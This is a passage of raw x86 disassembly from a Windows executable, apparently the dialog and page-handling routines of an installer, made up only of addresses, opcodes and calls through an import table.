  403a6b:	57                   	push   %edi
  403a6c:	ff 15 fc 80 40 00    	call   *0x4080fc
  403a72:	83 f8 ff             	cmp    $0xffffffff,%eax
  403a75:	74 04                	je     0x403a7b
  403a77:	a8 10                	test   $0x10,%al
  403a79:	75 06                	jne    0x403a81
  403a7b:	57                   	push   %edi
  403a7c:	e8 9f 20 00 00       	call   0x405b20
  403a81:	57                   	push   %edi
  403a82:	e8 52 20 00 00       	call   0x405ad9
  403a87:	50                   	push   %eax
  403a88:	55                   	push   %ebp
  403a89:	e8 b3 26 00 00       	call   0x406141
  403a8e:	55                   	push   %ebp
  403a8f:	e8 33 21 00 00       	call   0x405bc7
  403a94:	85 c0                	test   %eax,%eax
  403a96:	75 0c                	jne    0x403aa4
  403a98:	ff b6 18 01 00 00    	push   0x118(%esi)
  403a9e:	55                   	push   %ebp
  403a9f:	e8 bf 26 00 00       	call   0x406163
  403aa4:	68 40 80 00 00       	push   $0x8040
  403aa9:	53                   	push   %ebx
  403aaa:	53                   	push   %ebx
  403aab:	6a 01                	push   $0x1
  403aad:	6a 67                	push   $0x67
  403aaf:	ff 35 20 47 42 00    	push   0x424720
  403ab5:	ff 15 34 82 40 00    	call   *0x408234
  403abb:	a3 08 3f 42 00       	mov    %eax,0x423f08
  403ac0:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403ac4:	bf c0 3e 42 00       	mov    $0x423ec0,%edi
  403ac9:	74 7f                	je     0x403b4a
  403acb:	8b 0d 20 47 42 00    	mov    0x424720,%ecx
  403ad1:	be 10 a2 40 00       	mov    $0x40a210,%esi
  403ad6:	57                   	push   %edi
  403ad7:	c7 05 c4 3e 42 00 00 	movl   $0x401000,0x423ec4
  403ade:	10 40 00 
  403ae1:	89 0d d0 3e 42 00    	mov    %ecx,0x423ed0
  403ae7:	a3 d4 3e 42 00       	mov    %eax,0x423ed4
  403aec:	89 35 e4 3e 42 00    	mov    %esi,0x423ee4
  403af2:	ff 15 18 82 40 00    	call   *0x408218
  403af8:	66 85 c0             	test   %ax,%ax
  403afb:	0f 84 18 01 00 00    	je     0x403c19
  403b01:	8d 44 24 10          	lea    0x10(%esp),%eax
  403b05:	53                   	push   %ebx
  403b06:	50                   	push   %eax
  403b07:	53                   	push   %ebx
  403b08:	6a 30                	push   $0x30
  403b0a:	ff 15 1c 82 40 00    	call   *0x40821c
  403b10:	53                   	push   %ebx
  403b11:	ff 35 20 47 42 00    	push   0x424720
  403b17:	8b 44 24 24          	mov    0x24(%esp),%eax
  403b1b:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403b1f:	53                   	push   %ebx
  403b20:	53                   	push   %ebx
  403b21:	50                   	push   %eax
  403b22:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403b26:	2b 44 24 24          	sub    0x24(%esp),%eax
  403b2a:	50                   	push   %eax
  403b2b:	ff 74 24 2c          	push   0x2c(%esp)
  403b2f:	ff 74 24 2c          	push   0x2c(%esp)
  403b33:	68 00 00 00 80       	push   $0x80000000
  403b38:	53                   	push   %ebx
  403b39:	56                   	push   %esi
  403b3a:	68 80 00 00 00       	push   $0x80
  403b3f:	ff 15 20 82 40 00    	call   *0x408220
  403b45:	a3 10 0d 42 00       	mov    %eax,0x420d10
  403b4a:	53                   	push   %ebx
  403b4b:	e8 bb d8 ff ff       	call   0x40140b
  403b50:	85 c0                	test   %eax,%eax
  403b52:	74 08                	je     0x403b5c
  403b54:	6a 02                	push   $0x2
  403b56:	58                   	pop    %eax
  403b57:	e9 bf 00 00 00       	jmp    0x403c1b
  403b5c:	e8 c2 00 00 00       	call   0x403c23
  403b61:	39 1d e0 47 42 00    	cmp    %ebx,0x4247e0
  403b67:	0f 85 83 00 00 00    	jne    0x403bf0
  403b6d:	6a 05                	push   $0x5
  403b6f:	ff 35 10 0d 42 00    	push   0x420d10
  403b75:	ff 15 48 82 40 00    	call   *0x408248
  403b7b:	68 10 83 40 00       	push   $0x408310
  403b80:	e8 e6 28 00 00       	call   0x40646b
  403b85:	85 c0                	test   %eax,%eax
  403b87:	75 0a                	jne    0x403b93
  403b89:	68 04 83 40 00       	push   $0x408304
  403b8e:	e8 d8 28 00 00       	call   0x40646b
  403b93:	8b 35 24 82 40 00    	mov    0x408224,%esi
  403b99:	bd f8 82 40 00       	mov    $0x4082f8,%ebp
  403b9e:	57                   	push   %edi
  403b9f:	55                   	push   %ebp
  403ba0:	53                   	push   %ebx
  403ba1:	ff d6                	call   *%esi
  403ba3:	85 c0                	test   %eax,%eax
  403ba5:	75 16                	jne    0x403bbd
  403ba7:	57                   	push   %edi
  403ba8:	68 ec 82 40 00       	push   $0x4082ec
  403bad:	53                   	push   %ebx
  403bae:	ff d6                	call   *%esi
  403bb0:	57                   	push   %edi
  403bb1:	89 2d e4 3e 42 00    	mov    %ebp,0x423ee4
  403bb7:	ff 15 18 82 40 00    	call   *0x408218
  403bbd:	a1 00 3f 42 00       	mov    0x423f00,%eax
  403bc2:	53                   	push   %ebx
  403bc3:	83 c0 69             	add    $0x69,%eax
  403bc6:	68 fb 3c 40 00       	push   $0x403cfb
  403bcb:	0f b7 c0             	movzwl %ax,%eax
  403bce:	53                   	push   %ebx
  403bcf:	50                   	push   %eax
  403bd0:	ff 35 20 47 42 00    	push   0x424720
  403bd6:	ff 15 28 82 40 00    	call   *0x408228
  403bdc:	6a 05                	push   $0x5
  403bde:	8b f0                	mov    %eax,%esi
  403be0:	e8 26 d8 ff ff       	call   0x40140b
  403be5:	6a 01                	push   $0x1
  403be7:	e8 c2 fc ff ff       	call   0x4038ae
  403bec:	8b c6                	mov    %esi,%eax
  403bee:	eb 2b                	jmp    0x403c1b
  403bf0:	53                   	push   %ebx
  403bf1:	e8 44 17 00 00       	call   0x40533a
  403bf6:	85 c0                	test   %eax,%eax
  403bf8:	74 18                	je     0x403c12
  403bfa:	39 1d ec 3e 42 00    	cmp    %ebx,0x423eec
  403c00:	0f 85 4e ff ff ff    	jne    0x403b54
  403c06:	6a 02                	push   $0x2
  403c08:	e8 fe d7 ff ff       	call   0x40140b
  403c0d:	e9 42 ff ff ff       	jmp    0x403b54
  403c12:	6a 01                	push   $0x1
  403c14:	e8 f2 d7 ff ff       	call   0x40140b
  403c19:	33 c0                	xor    %eax,%eax
  403c1b:	5f                   	pop    %edi
  403c1c:	5e                   	pop    %esi
  403c1d:	5d                   	pop    %ebp
  403c1e:	5b                   	pop    %ebx
  403c1f:	83 c4 10             	add    $0x10,%esp
  403c22:	c3                   	ret
  403c23:	53                   	push   %ebx
  403c24:	55                   	push   %ebp
  403c25:	56                   	push   %esi
  403c26:	57                   	push   %edi
  403c27:	bf 00 b0 42 00       	mov    $0x42b000,%edi
  403c2c:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403c31:	57                   	push   %edi
  403c32:	e8 81 24 00 00       	call   0x4060b8
  403c37:	8b 35 84 47 42 00    	mov    0x424784,%esi
  403c3d:	85 f6                	test   %esi,%esi
  403c3f:	74 45                	je     0x403c86
  403c41:	8b 0d 34 47 42 00    	mov    0x424734,%ecx
  403c47:	8b 49 64             	mov    0x64(%ecx),%ecx
  403c4a:	8b d1                	mov    %ecx,%edx
  403c4c:	0f af ce             	imul   %esi,%ecx
  403c4f:	f7 da                	neg    %edx
  403c51:	03 0d 80 47 42 00    	add    0x424780,%ecx
  403c57:	03 ca                	add    %edx,%ecx
  403c59:	4e                   	dec    %esi
  403c5a:	66 8b 29             	mov    (%ecx),%bp
  403c5d:	66 33 e8             	xor    %ax,%bp
  403c60:	23 eb                	and    %ebx,%ebp
  403c62:	66 85 ed             	test   %bp,%bp
  403c65:	74 06                	je     0x403c6d
  403c67:	85 f6                	test   %esi,%esi
  403c69:	75 ec                	jne    0x403c57
  403c6b:	eb 19                	jmp    0x403c86
  403c6d:	8b 51 02             	mov    0x2(%ecx),%edx
  403c70:	89 15 00 3f 42 00    	mov    %edx,0x423f00
  403c76:	8b 51 06             	mov    0x6(%ecx),%edx
  403c79:	89 15 e8 47 42 00    	mov    %edx,0x4247e8
  403c7f:	8d 51 0a             	lea    0xa(%ecx),%edx
  403c82:	85 d2                	test   %edx,%edx
  403c84:	75 12                	jne    0x403c98
  403c86:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403c8b:	75 07                	jne    0x403c94
  403c8d:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403c92:	eb a3                	jmp    0x403c37
  403c94:	33 db                	xor    %ebx,%ebx
  403c96:	eb 9f                	jmp    0x403c37
  403c98:	89 15 fc 3e 42 00    	mov    %edx,0x423efc
  403c9e:	0f b7 01             	movzwl (%ecx),%eax
  403ca1:	50                   	push   %eax
  403ca2:	57                   	push   %edi
  403ca3:	e8 f7 23 00 00       	call   0x40609f
  403ca8:	e8 2f 00 00 00       	call   0x403cdc
  403cad:	a1 6c 47 42 00       	mov    0x42476c,%eax
  403cb2:	8b 35 68 47 42 00    	mov    0x424768,%esi
  403cb8:	85 c0                	test   %eax,%eax
  403cba:	74 1b                	je     0x403cd7
  403cbc:	8b f8                	mov    %eax,%edi
  403cbe:	8b 06                	mov    (%esi),%eax
  403cc0:	85 c0                	test   %eax,%eax
  403cc2:	74 0a                	je     0x403cce
  403cc4:	50                   	push   %eax
  403cc5:	8d 46 18             	lea    0x18(%esi),%eax
  403cc8:	50                   	push   %eax
  403cc9:	e8 95 24 00 00       	call   0x406163
  403cce:	81 c6 18 04 00 00    	add    $0x418,%esi
  403cd4:	4f                   	dec    %edi
  403cd5:	75 e7                	jne    0x403cbe
  403cd7:	5f                   	pop    %edi
  403cd8:	5e                   	pop    %esi
  403cd9:	5d                   	pop    %ebp
  403cda:	5b                   	pop    %ebx
  403cdb:	c3                   	ret
  403cdc:	56                   	push   %esi
  403cdd:	be 20 3f 42 00       	mov    $0x423f20,%esi
  403ce2:	6a fe                	push   $0xfffffffe
  403ce4:	56                   	push   %esi
  403ce5:	e8 79 24 00 00       	call   0x406163
  403cea:	56                   	push   %esi
  403ceb:	ff 35 10 0d 42 00    	push   0x420d10
  403cf1:	ff 15 40 82 40 00    	call   *0x408240
  403cf7:	8b c6                	mov    %esi,%eax
  403cf9:	5e                   	pop    %esi
  403cfa:	c3                   	ret
  403cfb:	83 ec 10             	sub    $0x10,%esp
  403cfe:	b9 10 01 00 00       	mov    $0x110,%ecx
  403d03:	53                   	push   %ebx
  403d04:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403d08:	55                   	push   %ebp
  403d09:	56                   	push   %esi
  403d0a:	3b d9                	cmp    %ecx,%ebx
  403d0c:	57                   	push   %edi
  403d0d:	0f 84 3b 01 00 00    	je     0x403e4e
  403d13:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403d19:	0f 84 2f 01 00 00    	je     0x403e4e
  403d1f:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403d23:	33 ed                	xor    %ebp,%ebp
  403d25:	83 fb 47             	cmp    $0x47,%ebx
  403d28:	75 13                	jne    0x403d3d
  403d2a:	6a 13                	push   $0x13
  403d2c:	55                   	push   %ebp
  403d2d:	55                   	push   %ebp
  403d2e:	55                   	push   %ebp
  403d2f:	55                   	push   %ebp
  403d30:	57                   	push   %edi
  403d31:	ff 35 10 0d 42 00    	push   0x420d10
  403d37:	ff 15 94 81 40 00    	call   *0x408194
  403d3d:	83 fb 05             	cmp    $0x5,%ebx
  403d40:	75 18                	jne    0x403d5a
  403d42:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403d46:	48                   	dec    %eax
  403d47:	f7 d8                	neg    %eax
  403d49:	1b c0                	sbb    %eax,%eax
  403d4b:	23 c3                	and    %ebx,%eax
  403d4d:	50                   	push   %eax
  403d4e:	ff 35 10 0d 42 00    	push   0x420d10
  403d54:	ff 15 48 82 40 00    	call   *0x408248
  403d5a:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  403d60:	75 1a                	jne    0x403d7c
  403d62:	ff 35 f8 3e 42 00    	push   0x423ef8
  403d68:	ff 15 70 82 40 00    	call   *0x408270
  403d6e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403d72:	a3 f8 3e 42 00       	mov    %eax,0x423ef8
  403d77:	e9 fd 03 00 00       	jmp    0x404179
  403d7c:	83 fb 11             	cmp    $0x11,%ebx
  403d7f:	75 11                	jne    0x403d92
  403d81:	55                   	push   %ebp
  403d82:	55                   	push   %ebp
  403d83:	57                   	push   %edi
  403d84:	ff 15 4c 82 40 00    	call   *0x40824c
  403d8a:	33 c0                	xor    %eax,%eax
  403d8c:	40                   	inc    %eax
  403d8d:	e9 0c 04 00 00       	jmp    0x40419e
  403d92:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  403d98:	0f 85 9d 00 00 00    	jne    0x403e3b
  403d9e:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  403da3:	56                   	push   %esi
  403da4:	57                   	push   %edi
  403da5:	ff 15 d0 81 40 00    	call   *0x4081d0
  403dab:	8b f8                	mov    %eax,%edi
  403dad:	3b fd                	cmp    %ebp,%edi
  403daf:	74 1d                	je     0x403dce
  403db1:	55                   	push   %ebp
  403db2:	55                   	push   %ebp
  403db3:	68 f3 00 00 00       	push   $0xf3
  403db8:	57                   	push   %edi
  403db9:	ff 15 00 82 40 00    	call   *0x408200
  403dbf:	57                   	push   %edi
  403dc0:	ff 15 90 81 40 00    	call   *0x408190
  403dc6:	85 c0                	test   %eax,%eax
  403dc8:	0f 84 ce 03 00 00    	je     0x40419c
  403dce:	83 fe 01             	cmp    $0x1,%esi
  403dd1:	75 03                	jne    0x403dd6
  403dd3:	56                   	push   %esi
  403dd4:	eb 2e                	jmp    0x403e04
  403dd6:	83 fe 03             	cmp    $0x3,%esi
  403dd9:	75 0c                	jne    0x403de7
  403ddb:	39 2d f8 a1 40 00    	cmp    %ebp,0x40a1f8
  403de1:	7e 3f                	jle    0x403e22
  403de3:	6a ff                	push   $0xffffffff
  403de5:	eb 1d                	jmp    0x403e04
  403de7:	6a 02                	push   $0x2
  403de9:	5f                   	pop    %edi
  403dea:	3b f7                	cmp    %edi,%esi
  403dec:	75 34                	jne    0x403e22
  403dee:	39 2d cc 47 42 00    	cmp    %ebp,0x4247cc
  403df4:	74 15                	je     0x403e0b
  403df6:	57                   	push   %edi
  403df7:	e8 0f d6 ff ff       	call   0x40140b
  403dfc:	89 3d 00 01 42 00    	mov    %edi,0x420100
  403e02:	6a 78                	push   $0x78
  403e04:	e8 9f 03 00 00       	call   0x4041a8
  403e09:	eb 30                	jmp    0x403e3b
  403e0b:	6a 03                	push   $0x3
  403e0d:	e8 f9 d5 ff ff       	call   0x40140b
  403e12:	85 c0                	test   %eax,%eax
  403e14:	75 25                	jne    0x403e3b
  403e16:	c7 05 00 01 42 00 01 	movl   $0x1,0x420100
  403e1d:	00 00 00 
  403e20:	eb e0                	jmp    0x403e02
  403e22:	ff 74 24 30          	push   0x30(%esp)
  403e26:	ff 74 24 30          	push   0x30(%esp)
  403e2a:	68 11 01 00 00       	push   $0x111
  403e2f:	ff 35 f8 3e 42 00    	push   0x423ef8
  403e35:	ff 15 00 82 40 00    	call   *0x408200
  403e3b:	ff 74 24 30          	push   0x30(%esp)
  403e3f:	ff 74 24 30          	push   0x30(%esp)
  403e43:	53                   	push   %ebx
  403e44:	e8 ed 03 00 00       	call   0x404236
  403e49:	e9 50 03 00 00       	jmp    0x40419e
  403e4e:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e52:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403e56:	3b d9                	cmp    %ecx,%ebx
  403e58:	a3 18 0d 42 00       	mov    %eax,0x420d18
  403e5d:	75 4d                	jne    0x403eac
  403e5f:	8b 35 d0 81 40 00    	mov    0x4081d0,%esi
  403e65:	6a 01                	push   $0x1
  403e67:	57                   	push   %edi
  403e68:	89 3d 28 47 42 00    	mov    %edi,0x424728
  403e6e:	ff d6                	call   *%esi
  403e70:	6a 02                	push   $0x2
  403e72:	57                   	push   %edi
  403e73:	a3 2c 0d 42 00       	mov    %eax,0x420d2c
  403e78:	ff d6                	call   *%esi
  403e7a:	6a ff                	push   $0xffffffff
  403e7c:	6a 1c                	push   $0x1c
  403e7e:	57                   	push   %edi
  403e7f:	a3 f8 fc 41 00       	mov    %eax,0x41fcf8
  403e84:	e8 46 03 00 00       	call   0x4041cf
  403e89:	ff 35 08 3f 42 00    	push   0x423f08
  403e8f:	6a f2                	push   $0xfffffff2
  403e91:	57                   	push   %edi
  403e92:	ff 15 88 81 40 00    	call   *0x408188
  403e98:	6a 04                	push   $0x4
  403e9a:	e8 6c d5 ff ff       	call   0x40140b
  403e9f:	a3 ec 3e 42 00       	mov    %eax,0x423eec
  403ea4:	33 c0                	xor    %eax,%eax
  403ea6:	40                   	inc    %eax
  403ea7:	a3 18 0d 42 00       	mov    %eax,0x420d18
  403eac:	8b 0d f8 a1 40 00    	mov    0x40a1f8,%ecx
  403eb2:	33 ed                	xor    %ebp,%ebp
  403eb4:	8b f1                	mov    %ecx,%esi
  403eb6:	c1 e6 06             	shl    $0x6,%esi
  403eb9:	03 35 60 47 42 00    	add    0x424760,%esi
  403ebf:	3b cd                	cmp    %ebp,%ecx
  403ec1:	7c 3e                	jl     0x403f01
  403ec3:	83 f8 01             	cmp    $0x1,%eax
  403ec6:	75 31                	jne    0x403ef9
  403ec8:	55                   	push   %ebp
  403ec9:	ff 76 10             	push   0x10(%esi)
  403ecc:	e8 b8 d4 ff ff       	call   0x401389
  403ed1:	85 c0                	test   %eax,%eax
  403ed3:	74 24                	je     0x403ef9
  403ed5:	6a 01                	push   $0x1
  403ed7:	55                   	push   %ebp
  403ed8:	68 0f 04 00 00       	push   $0x40f
  403edd:	ff 35 f8 3e 42 00    	push   0x423ef8
  403ee3:	ff 15 00 82 40 00    	call   *0x408200
  403ee9:	33 c0                	xor    %eax,%eax
  403eeb:	39 2d ec 3e 42 00    	cmp    %ebp,0x423eec
  403ef1:	0f 94 c0             	sete   %al
  403ef4:	e9 a5 02 00 00       	jmp    0x40419e
  403ef9:	39 2e                	cmp    %ebp,(%esi)
  403efb:	0f 84 9b 02 00 00    	je     0x40419c
  403f01:	68 0b 04 00 00       	push   $0x40b
  403f06:	e8 10 03 00 00       	call   0x40421b
  403f0b:	a1 18 0d 42 00       	mov    0x420d18,%eax
  403f10:	01 05 f8 a1 40 00    	add    %eax,0x40a1f8
  403f16:	c1 e0 06             	shl    $0x6,%eax
  403f19:	03 f0                	add    %eax,%esi
  403f1b:	a1 f8 a1 40 00       	mov    0x40a1f8,%eax
  403f20:	3b 05 64 47 42 00    	cmp    0x424764,%eax
  403f26:	75 07                	jne    0x403f2f
  403f28:	6a 01                	push   $0x1
  403f2a:	e8 dc d4 ff ff       	call   0x40140b
  403f2f:	39 2d ec 3e 42 00    	cmp    %ebp,0x423eec
  403f35:	0f 85 1f 02 00 00    	jne    0x40415a
  403f3b:	a1 64 47 42 00       	mov    0x424764,%eax
  403f40:	39 05 f8 a1 40 00    	cmp    %eax,0x40a1f8
  403f46:	0f 83 0e 02 00 00    	jae    0x40415a
  403f4c:	ff 76 24             	push   0x24(%esi)
  403f4f:	8b 5e 14             	mov    0x14(%esi),%ebx
  403f52:	68 00 c8 42 00       	push   $0x42c800
  403f57:	e8 07 22 00 00       	call   0x406163
  403f5c:	ff 76 20             	push   0x20(%esi)
  403f5f:	68 19 fc ff ff       	push   $0xfffffc19
  403f64:	57                   	push   %edi
  403f65:	e8 65 02 00 00       	call   0x4041cf
  403f6a:	ff 76 1c             	push   0x1c(%esi)
  403f6d:	68 1b fc ff ff       	push   $0xfffffc1b
  403f72:	57                   	push   %edi
  403f73:	e8 57 02 00 00       	call   0x4041cf
  403f78:	ff 76 28             	push   0x28(%esi)
  403f7b:	68 1a fc ff ff       	push   $0xfffffc1a
  403f80:	57                   	push   %edi
  403f81:	e8 49 02 00 00       	call   0x4041cf
  403f86:	6a 03                	push   $0x3
  403f88:	57                   	push   %edi
  403f89:	ff 15 d0 81 40 00    	call   *0x4081d0
  403f8f:	39 2d cc 47 42 00    	cmp    %ebp,0x4247cc
  403f95:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403f99:	74 08                	je     0x403fa3
  403f9b:	66 81 e3 fd fe       	and    $0xfefd,%bx
  403fa0:	83 cb 04             	or     $0x4,%ebx
  403fa3:	8b cb                	mov    %ebx,%ecx
  403fa5:	83 e1 08             	and    $0x8,%ecx
  403fa8:	51                   	push   %ecx
  403fa9:	50                   	push   %eax
  403faa:	ff 15 48 82 40 00    	call   *0x408248
  403fb0:	8b c3                	mov    %ebx,%eax
  403fb2:	25 00 01 00 00       	and    $0x100,%eax
  403fb7:	50                   	push   %eax
  403fb8:	ff 74 24 30          	push   0x30(%esp)
  403fbc:	ff 15 f8 81 40 00    	call   *0x4081f8
  403fc2:	8b c3                	mov    %ebx,%eax
  403fc4:	83 e0 02             	and    $0x2,%eax
  403fc7:	50                   	push   %eax
  403fc8:	e8 24 02 00 00       	call   0x4041f1
  403fcd:	83 e3 04             	and    $0x4,%ebx
  403fd0:	53                   	push   %ebx
  403fd1:	ff 35 f8 fc 41 00    	push   0x41fcf8
  403fd7:	ff 15 f8 81 40 00    	call   *0x4081f8
  403fdd:	3b dd                	cmp    %ebp,%ebx
  403fdf:	74 03                	je     0x403fe4
  403fe1:	55                   	push   %ebp
  403fe2:	eb 02                	jmp    0x403fe6
  403fe4:	6a 01                	push   $0x1
  403fe6:	68 60 f0 00 00       	push   $0xf060
  403feb:	55                   	push   %ebp
  403fec:	57                   	push   %edi
  403fed:	ff 15 84 81 40 00    	call   *0x408184
  403ff3:	50                   	push   %eax
  403ff4:	ff 15 8c 81 40 00    	call   *0x40818c
  403ffa:	8b 1d 00 82 40 00    	mov    0x408200,%ebx
  404000:	6a 01                	push   $0x1
  404002:	55                   	push   %ebp
  404003:	68 f4 00 00 00       	push   $0xf4
  404008:	ff 74 24 38          	push   0x38(%esp)
  40400c:	ff d3                	call   *%ebx
  40400e:	39 2d cc 47 42 00    	cmp    %ebp,0x4247cc
  404014:	74 13                	je     0x404029
  404016:	55                   	push   %ebp
  404017:	6a 02                	push   $0x2
  404019:	68 01 04 00 00       	push   $0x401
  40401e:	57                   	push   %edi
  40401f:	ff d3                	call   *%ebx
  404021:	ff 35 f8 fc 41 00    	push   0x41fcf8
  404027:	eb 06                	jmp    0x40402f
  404029:	ff 35 2c 0d 42 00    	push   0x420d2c
  40402f:	e8 d0 01 00 00       	call   0x404204
  404034:	e8 a3 fc ff ff       	call   0x403cdc
  404039:	bb 30 0d 42 00       	mov    $0x420d30,%ebx
  40403e:	50                   	push   %eax
  40403f:	53                   	push   %ebx
  404040:	e8 fc 20 00 00       	call   0x406141
  404045:	ff 76 18             	push   0x18(%esi)
  404048:	53                   	push   %ebx
  404049:	e8 09 21 00 00       	call   0x406157
  40404e:	03 c3                	add    %ebx,%eax
  404050:	50                   	push   %eax
  404051:	e8 0d 21 00 00       	call   0x406163
  404056:	53                   	push   %ebx
  404057:	57                   	push   %edi
  404058:	ff 15 40 82 40 00    	call   *0x408240
  40405e:	55                   	push   %ebp
  40405f:	ff 76 08             	push   0x8(%esi)
  404062:	e8 22 d3 ff ff       	call   0x401389
  404067:	85 c0                	test   %eax,%eax
  404069:	0f 85 9c fe ff ff    	jne    0x403f0b
  40406f:	39 2e                	cmp    %ebp,(%esi)
  404071:	0f 84 94 fe ff ff    	je     0x403f0b
  404077:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  40407b:	75 1d                	jne    0x40409a
  40407d:	39 2d cc 47 42 00    	cmp    %ebp,0x4247cc
  404083:	0f 85 13 01 00 00    	jne    0x40419c
  404089:	39 2d c0 47 42 00    	cmp    %ebp,0x4247c0
  40408f:	0f 85 76 fe ff ff    	jne    0x403f0b
  404095:	e9 02 01 00 00       	jmp    0x40419c
  40409a:	ff 35 f8 3e 42 00    	push   0x423ef8
  4040a0:	ff 15 70 82 40 00    	call   *0x408270
  4040a6:	89 35 08 05 42 00    	mov    %esi,0x420508
  4040ac:	39 2e                	cmp    %ebp,(%esi)
  4040ae:	0f 8e c5 00 00 00    	jle    0x404179
  4040b4:	8b 46 04             	mov    0x4(%esi),%eax
  4040b7:	56                   	push   %esi
  4040b8:	ff 34 85 fc a1 40 00 	push   0x40a1fc(,%eax,4)
  4040bf:	66 8b 06             	mov    (%esi),%ax
  4040c2:	66 03 05 00 3f 42 00 	add    0x423f00,%ax
  4040c9:	57                   	push   %edi
  4040ca:	0f b7 c0             	movzwl %ax,%eax
  4040cd:	50                   	push   %eax
  4040ce:	ff 35 20 47 42 00    	push   0x424720
  4040d4:	ff 15 38 82 40 00    	call   *0x408238
  4040da:	3b c5                	cmp    %ebp,%eax
  4040dc:	a3 f8 3e 42 00       	mov    %eax,0x423ef8
  4040e1:	0f 84 92 00 00 00    	je     0x404179
  4040e7:	ff 76 2c             	push   0x2c(%esi)
  4040ea:	6a 06                	push   $0x6
  4040ec:	50                   	push   %eax
  4040ed:	e8 dd 00 00 00       	call   0x4041cf
  4040f2:	8d 44 24 10          	lea    0x10(%esp),%eax
  4040f6:	50                   	push   %eax
  4040f7:	68 fa 03 00 00       	push   $0x3fa
  4040fc:	57                   	push   %edi
  4040fd:	ff 15 d0 81 40 00    	call   *0x4081d0
  404103:	50                   	push   %eax
  404104:	ff 15 cc 81 40 00    	call   *0x4081cc
  40410a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40410e:	50                   	push   %eax
  40410f:	57                   	push   %edi
  404110:	ff 15 c8 81 40 00    	call   *0x4081c8
  404116:	6a 15                	push   $0x15
  404118:	55                   	push   %ebp
  404119:	55                   	push   %ebp
  40411a:	ff 74 24 20          	push   0x20(%esp)
  40411e:	ff 74 24 20          	push   0x20(%esp)
  404122:	55                   	push   %ebp
  404123:	ff 35 f8 3e 42 00    	push   0x423ef8
  404129:	ff 15 94 81 40 00    	call   *0x408194
  40412f:	55                   	push   %ebp
  404130:	ff 76 0c             	push   0xc(%esi)
  404133:	e8 51 d2 ff ff       	call   0x401389
  404138:	39 2d ec 3e 42 00    	cmp    %ebp,0x423eec
  40413e:	75 5c                	jne    0x40419c
  404140:	6a 08                	push   $0x8
  404142:	ff 35 f8 3e 42 00    	push   0x423ef8
  404148:	ff 15 48 82 40 00    	call   *0x408248
  40414e:	68 05 04 00 00       	push   $0x405
  404153:	e8 c3 00 00 00       	call   0x40421b
  404158:	eb 1f                	jmp    0x404179
  40415a:	ff 35 f8 3e 42 00    	push   0x423ef8
  404160:	ff 15 70 82 40 00    	call   *0x408270
  404166:	ff 35 00 01 42 00    	push   0x420100
  40416c:	89 2d 28 47 42 00    	mov    %ebp,0x424728
  404172:	57                   	push   %edi
  404173:	ff 15 14 82 40 00    	call   *0x408214
  404179:	39 2d 30 1d 42 00    	cmp    %ebp,0x421d30
  40417f:	75 1b                	jne    0x40419c
  404181:	39 2d f8 3e 42 00    	cmp    %ebp,0x423ef8
  404187:	74 13                	je     0x40419c
  404189:	6a 0a                	push   $0xa
  40418b:	57                   	push   %edi
  40418c:	ff 15 48 82 40 00    	call   *0x408248
  404192:	c7 05 30 1d 42 00 01 	movl   $0x1,0x421d30
  404199:	00 00 00 
  40419c:	33 c0                	xor    %eax,%eax
  40419e:	5f                   	pop    %edi
  40419f:	5e                   	pop    %esi
  4041a0:	5d                   	pop    %ebp
  4041a1:	5b                   	pop    %ebx
  4041a2:	83 c4 10             	add    $0x10,%esp
  4041a5:	c2 10 00             	ret    $0x10
  4041a8:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  4041ad:	75 06                	jne    0x4041b5
  4041af:	ff 05 ec 3e 42 00    	incl   0x423eec
  4041b5:	6a 00                	push   $0x0
  4041b7:	ff 74 24 08          	push   0x8(%esp)
  4041bb:	68 08 04 00 00       	push   $0x408
  4041c0:	ff 35 28 47 42 00    	push   0x424728
  4041c6:	ff 15 00 82 40 00    	call   *0x408200
  4041cc:	c2 04 00             	ret    $0x4
  4041cf:	ff 74 24 0c          	push   0xc(%esp)
  4041d3:	6a 00                	push   $0x0
  4041d5:	e8 89 1f 00 00       	call   0x406163
  4041da:	50                   	push   %eax
  4041db:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4041df:	05 e8 03 00 00       	add    $0x3e8,%eax
  4041e4:	50                   	push   %eax
  4041e5:	ff 74 24 0c          	push   0xc(%esp)
  4041e9:	e8 4d 16 00 00       	call   0x40583b
  4041ee:	c2 0c 00             	ret    $0xc
  4041f1:	ff 74 24 04          	push   0x4(%esp)
  4041f5:	ff 35 2c 0d 42 00    	push   0x420d2c
  4041fb:	ff 15 f8 81 40 00    	call   *0x4081f8
  404201:	c2 04 00             	ret    $0x4
  404204:	6a 01                	push   $0x1
  404206:	ff 74 24 08          	push   0x8(%esp)
  40420a:	6a 28                	push   $0x28
  40420c:	ff 35 28 47 42 00    	push   0x424728
  404212:	ff 15 00 82 40 00    	call   *0x408200
  404218:	c2 04 00             	ret    $0x4
  40421b:	a1 f8 3e 42 00       	mov    0x423ef8,%eax
  404220:	85 c0                	test   %eax,%eax
  404222:	74 0f                	je     0x404233
  404224:	6a 00                	push   $0x0
  404226:	6a 00                	push   $0x0
  404228:	ff 74 24 0c          	push   0xc(%esp)
  40422c:	50                   	push   %eax
  40422d:	ff 15 00 82 40 00    	call   *0x408200
  404233:	c2 04 00             	ret    $0x4
  404236:	55                   	push   %ebp
  404237:	8b ec                	mov    %esp,%ebp
  404239:	83 ec 0c             	sub    $0xc,%esp
  40423c:	8b 45 08             	mov    0x8(%ebp),%eax
  40423f:	56                   	push   %esi
  404240:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  404245:	83 f8 05             	cmp    $0x5,%eax
